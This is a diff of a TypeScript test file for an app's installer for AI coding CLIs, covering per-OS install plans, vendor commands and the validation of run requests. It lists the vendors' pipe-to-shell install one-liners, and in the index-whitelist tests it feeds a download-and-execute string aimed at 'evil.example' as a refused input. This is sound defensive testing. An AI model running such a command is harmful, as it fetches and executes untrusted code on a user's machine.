@@ -1,6 +1,8 @@
 /** Harness setup inside the app (spec 051): plans per OS, sign-in output parsing, link allowlist, paste rules. `npm run test:harnesssetup`. No process runs, nothing is installed. */
 import * as assert from 'assert';
-import { OFFICIAL_PAGES, SIGN_IN, allowedSignInUrl, installPlans, lastLines, managersFor, parseSignIn, simFoundFor, simManagers, stripAnsi, updatePlans, validPaste } from '../src/shared/harnesssetup';
+import * as fs from 'fs';
+import * as path from 'path';
+import { OFFICIAL_PAGES, SIGN_IN, allowedSignInUrl, installPlans, lastLines, managersFor, manualCommands, parseSignIn, simFoundFor, simManagers, stripAnsi, runRequest, updatePlans, validPaste, validPlanIndex } from '../src/shared/harnesssetup';
 import type { PackageManager } from '../src/shared/harnesssetup';
 import { EventEmitter } from 'events';
 import { HarnessSetup, confirmText, maskOAuth, posixTrusted } from '../src/main/harnesssetup';
@@ -17,7 +19,8 @@ const only = (...m: PackageManager[]) => new Set<PackageManager>(m);
     'npm install -g @anthropic-ai/claude-code',
   ]);
   assert.deepStrictEqual(installPlans('claude', 'darwin', all).map((p) => p.display), ['brew install --cask claude-code', 'npm install -g @anthropic-ai/claude-code']);
-  assert.match(installPlans('claude', 'darwin', all)[1].note ?? '', /Deprecated/);
+  assert.strictEqual(installPlans('claude', 'darwin', all)[1].note, 'Needs Node.js 22 or later. Anthropic recommends its native installer.', 'not called deprecated: Anthropic no longer does (read 2026-10-21)');
+  assert.ok(!['win32', 'darwin', 'linux'].some((os) => installPlans('claude', os, new Set<PackageManager>(['winget', 'brew', 'npm', 'bash', 'powershell'])).some((p) => /deprecat/i.test(p.note ?? ''))), 'no Claude route says deprecated');
   // spec 060 Q1: least privilege first: npm (a home-folder install) before Homebrew, and before winget on Windows
   assert.deepStrictEqual(installPlans('copilot', 'darwin', all).map((p) => p.display), ['npm install -g @github/copilot', 'brew install --cask copilot-cli']);
   assert.deepStrictEqual(installPlans('copilot', 'win32', all)[1].args, ['install', '--id', 'GitHub.Copilot', '-e', '--source', 'winget', '--accept-source-agreements', '--accept-package-agreements']);
@@ -346,6 +349,109 @@ void (async () => {
     assert.deepStrictEqual(hs.plans('copilot', 'install', []).plans, [], 'nothing assumed: no route');
     assert.deepStrictEqual(looked, [], 'an assumed set does not look at this machine');
     assert.deepStrictEqual(hs.plans('copilot', 'install').plans.map((p) => p.manager), ['official', 'npm', 'brew'], 'without it, what is found here is used (least privilege first)');
+  }
+  // spec 060 FR-009: the vendors' commands to run yourself, per OS, word for word from their install pages (read 2026-10-21)
+  {
+    const cmds = (k: 'claude' | 'copilot' | 'codex', os: string) => manualCommands(k, os).map((c) => `${c.label}: ${c.command}`);
+    assert.deepStrictEqual(cmds('copilot', 'win32'), ['PowerShell (winget): winget install GitHub.Copilot', 'npm: npm install -g @github/copilot']);
+    assert.deepStrictEqual(cmds('claude', 'win32'), ['PowerShell: irm https://claude.ai/install.ps1 | iex', 'PowerShell (winget): winget install Anthropic.ClaudeCode', 'npm: npm install -g @anthropic-ai/claude-code']);
+    assert.deepStrictEqual(cmds('codex', 'win32'), ['PowerShell: powershell -ExecutionPolicy ByPass -c "irm https://chatgpt.com/codex/install.ps1 | iex"', 'npm: npm install -g @openai/codex']);
+    assert.ok(!cmds('codex', 'win32').some((c) => /winget/.test(c)), 'OpenAI documents no winget package: none is offered');
+    assert.deepStrictEqual(cmds('copilot', 'darwin'), ['Terminal: curl -fsSL https://gh.io/copilot-install | bash', 'Homebrew: brew install --cask copilot-cli', 'npm: npm install -g @github/copilot']);
+    assert.deepStrictEqual(cmds('codex', 'linux'), ['Terminal: curl -fsSL https://chatgpt.com/codex/install.sh | sh', 'npm: npm install -g @openai/codex']);
+    for (const k of ['claude', 'copilot', 'codex'] as const) {
+      assert.ok(manualCommands(k, 'win32').every((c) => c.label === 'npm' || /^PowerShell( \(winget\))?$/.test(c.label)), `Windows labels name PowerShell (${k})`);
+      for (const os of ['darwin', 'linux']) assert.ok(!manualCommands(k, os).some((c) => /winget|PowerShell|irm /.test(c.label + c.command)), `no Windows command on ${os} (${k})`);
+      assert.ok(!manualCommands(k, 'win32').some((c) => /curl |brew /.test(c.command)), `no macOS/Linux command on Windows (${k})`);
+    }
+    assert.deepStrictEqual(manualCommands('claude', 'freebsd'), [], 'unknown OS: none');
+    const a = manualCommands('copilot', 'win32'); a[0].command = 'x';
+    assert.strictEqual(manualCommands('copilot', 'win32')[0].command, 'winget install GitHub.Copilot', 'callers get copies');
+    // HarnessSetup.plans carries them, for the simulated OS too (FR-011)
+    const hs = new HarnessSetup({ detectEnv: { platform: 'linux', env: { PATH: '/usr/bin' }, homedir: '/home/u', isFile: () => false }, spawn: () => { throw new Error('no'); }, killTree: () => undefined, send: () => undefined, redetect: async () => undefined } as never);
+    assert.deepStrictEqual(hs.plans('copilot', 'install').manual.map((c) => c.label), ['Terminal', 'Homebrew', 'npm']);
+    const w = hs.plans('copilot', 'install', simFoundFor('win32'), 'win32');
+    assert.deepStrictEqual([w.plans.map((p) => p.manager), w.manual.map((c) => c.label)], [['winget'], ['PowerShell (winget)', 'npm']], 'simulated Windows: winget route and PowerShell commands');
+    assert.deepStrictEqual(hs.plans('copilot', 'install', undefined, 'win32').manual.map((c) => c.label), ['Terminal', 'Homebrew', 'npm'], 'simPlatform only with an assumed set');
+  }
+  // spec 060 FR-010: winget.exe is an App Execution Alias in %LOCALAPPDATA%\Microsoft\WindowsApps: found there, and run by that path
+  {
+    const alias = 'C:\\Users\\u\\AppData\\Local\\Microsoft\\WindowsApps\\winget.exe';
+    const calls: string[] = [];
+    let resolved = 0;
+    const hs = new HarnessSetup({
+      detectEnv: { platform: 'win32', env: { Path: 'C:\\Windows\\System32', SystemRoot: 'C:\\Windows', LOCALAPPDATA: 'C:\\Users\\u\\AppData\\Local' }, homedir: 'C:\\Users\\u', isFile: (f: string) => f === alias },
+      spawn: (file: string) => { calls.push(file); const e = Object.assign(new EventEmitter(), { stdout: new EventEmitter(), stderr: new EventEmitter(), stdin: null }); return e as never; },
+      killTree: () => undefined, send: () => undefined, redetect: async () => undefined,
+      realpath: (p: string) => { resolved++; throw new Error('EACCES ' + p); },
+    } as never);
+    assert.strictEqual(hs.find('winget'), alias, 'found in WindowsApps although PATH lacks the folder');
+    const plans = hs.plans('copilot', 'install').plans;
+    assert.deepStrictEqual(plans.map((p) => p.manager), ['winget'], 'Copilot on a Windows PC without Node.js: the winget route');
+    const p = hs.prepare('copilot', 'install', 0);
+    assert.ok(p.ok, 'prepared: ' + JSON.stringify(p));
+    if (p.ok) {
+      assert.strictEqual(p.job.spawnFile, alias, 'the alias itself runs (never resolved into WindowsApps\' package folder)');
+      assert.deepStrictEqual(p.job.spawnArgs, ['install', '--id', 'GitHub.Copilot', '-e', '--source', 'winget', '--accept-source-agreements', '--accept-package-agreements'], 'fixed argv, no shell');
+      assert.strictEqual(p.job.verbatim, false);
+    }
+    assert.strictEqual(resolved, 0, 'realpath is not asked for an alias');
+  }
+  // spec 060 FR-012: Run beside a command picks the matching route; the window sends only an index, main runs its own fixed argv
+  {
+    for (const os of ['win32', 'darwin', 'linux']) for (const k of ['claude', 'copilot', 'codex'] as const) {
+      assert.ok(manualCommands(k, os).every((c) => ['official', 'winget', 'brew', 'npm'].includes(c.route)), `every command names its route (${k}, ${os})`);
+    }
+    assert.deepStrictEqual(manualCommands('claude', 'win32').map((c) => c.route), ['official', 'winget', 'npm']);
+    assert.deepStrictEqual(manualCommands('codex', 'win32').map((c) => c.route), ['official', 'npm']);
+    assert.deepStrictEqual(manualCommands('copilot', 'win32').map((c) => c.route), ['winget', 'npm']);
+    // each Windows route a manual command stands for exists in the fixed table, so Run always has something to start when found
+    for (const k of ['claude', 'copilot', 'codex'] as const) {
+      const all = installPlans(k, 'win32', new Set(['powershell', 'winget', 'npm'] as const)).map((p) => p.manager);
+      assert.ok(manualCommands(k, 'win32').every((c) => all.includes(c.route)), `every Windows command has a runnable route (${k}): ${all}`);
+    }
+    // the vendors' PowerShell one-liners run as the same script, downloaded from fixed hosts and run as a file (never -Command / iex)
+    for (const k of ['claude', 'codex'] as const) {
+      const off = installPlans(k, 'win32', new Set(['powershell'] as const))[0];
+      assert.strictEqual(off.manager, 'official');
+      assert.strictEqual(off.bin, 'powershell');
+      assert.deepStrictEqual(off.args, ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File'], `fixed argv, the downloaded file appended by main (${k})`);
+      assert.ok(!off.args.some((a) => /^-(c|Command|EncodedCommand)$/i.test(a) || /iex|irm|\|/.test(a)), 'no -Command, no pipe into iex');
+      assert.ok(/^https:\/\/(claude\.ai|chatgpt\.com)\//.test(off.script?.url ?? ''), 'the vendor\'s own script URL');
+    }
+    // Copilot on a PC without Node.js: winget is the route, and its note says it needs no Node.js
+    const cw = installPlans('copilot', 'win32', new Set(['powershell', 'winget'] as const));
+    assert.deepStrictEqual(cw.map((p) => p.manager), ['winget']);
+    assert.ok(/No Node\.js needed/.test(cw[0].note ?? ''), 'the dialog says winget needs no Node.js');
+    // the index whitelist: integers 0-7 only; anything else is refused (it used to fall back to the first plan)
+    for (const ok of [0, 1, 7]) assert.strictEqual(validPlanIndex(ok), ok);
+    for (const bad of [-1, 8, 1.5, NaN, Infinity, '0', '1', null, undefined, {}, [0], 'official', 'irm https://evil.example | iex', { valueOf: () => 0 }]) assert.strictEqual(validPlanIndex(bad), undefined, 'refused: ' + String(bad));
+    // review on #469: harness:run checks the window's arguments with runRequest, and the handler runs exactly what it returns
+    assert.deepStrictEqual(runRequest('copilot', 'install', 2), { kind: 'copilot', op: 'install', idx: 2 });
+    assert.deepStrictEqual(runRequest('claude', 'update', 0), { kind: 'claude', op: 'update', idx: 0 });
+    assert.deepStrictEqual(runRequest('codex', 'signin', 'anything'), { kind: 'codex', op: 'signin', idx: 0 }, 'sign-in has one fixed command');
+    for (const bad of [-1, 8, 1.5, '1', null, undefined, [0], 'irm https://evil.example | iex']) {
+      assert.strictEqual(runRequest('copilot', 'install', bad), undefined, 'install refuses index ' + String(bad));
+      assert.strictEqual(runRequest('copilot', 'update', bad), undefined, 'update refuses index ' + String(bad));
+    }
+    assert.strictEqual(runRequest('gemini', 'install', 0), undefined, 'unknown kind');
+    assert.strictEqual(runRequest('copilot', 'uninstall', 0), undefined, 'unknown op');
+    {
+      const ipc = fs.readFileSync(path.join(__dirname, '..', '..', 'src', 'main', 'ipc', 'harness.ts'), 'utf8');
+      const body = ipc.slice(ipc.indexOf("ipcHandle('harness:run'"), ipc.indexOf("ipcHandle('harness:paste'"));
+      assert.ok(body.length > 0 && /const req = fromApp\(e\) \? runRequest\(kind, op, planIndex\) : undefined;\s*if \(!req\) return/.test(body), 'harness:run checks sender and arguments with runRequest first');
+      assert.deepStrictEqual(body.match(/\bprepare\([^)]*\)/g), ['prepare(req.kind, req.op, req.idx)'], 'harness:run prepares only what runRequest returned');
+    }
+    // an index past the found routes is refused by prepare too (nothing spawns)
+    let spawned = 0;
+    const hs = new HarnessSetup({
+      detectEnv: { platform: 'win32', env: { Path: 'C:\\Windows\\System32', SystemRoot: 'C:\\Windows', LOCALAPPDATA: 'C:\\Users\\u\\AppData\\Local' }, homedir: 'C:\\Users\\u', isFile: (f: string) => /WindowsPowerShell\\v1\.0\\powershell\.exe$/i.test(f) },
+      spawn: () => { spawned++; throw new Error('no'); }, killTree: () => undefined, send: () => undefined, redetect: async () => undefined, realpath: (p: string) => p,
+    } as never);
+    const pc = hs.prepare('claude', 'install', 0);
+    assert.ok(pc.ok && pc.job.spawnFile === 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' && pc.job.script?.url === 'https://claude.ai/install.ps1', 'Claude on Windows: System32 PowerShell runs the downloaded install.ps1: ' + JSON.stringify(pc));
+    assert.ok(!hs.prepare('claude', 'install', 1).ok, 'no second route found here: refused');
+    assert.strictEqual(spawned, 0, 'prepare never spawns');
   }
   console.log('harnesssetup: all checks passed');
 })().catch((e) => { console.error(e); process.exit(1); });
